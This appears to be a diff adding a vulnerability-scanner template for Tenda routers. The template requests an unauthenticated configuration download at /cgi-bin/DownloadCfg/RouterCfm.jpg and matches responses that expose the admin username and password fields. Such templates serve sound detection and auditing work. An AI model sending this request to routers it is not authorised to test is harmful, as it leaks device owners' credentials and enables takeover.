@@ -1,0 +1,29 @@
+id: tenda-router-routercfm-jpg-info-leak
+info:
+  name: "Tenda Router RouterCfm.jpg 信息泄露漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: tenda
+http:
+  - method: GET
+    path:
+      - "/cgi-bin/DownloadCfg/RouterCfm.jpg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "http_username="
+          - "http_passwd="
+      - type: word
+        part: header
+        words:
+          - "config/conf"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
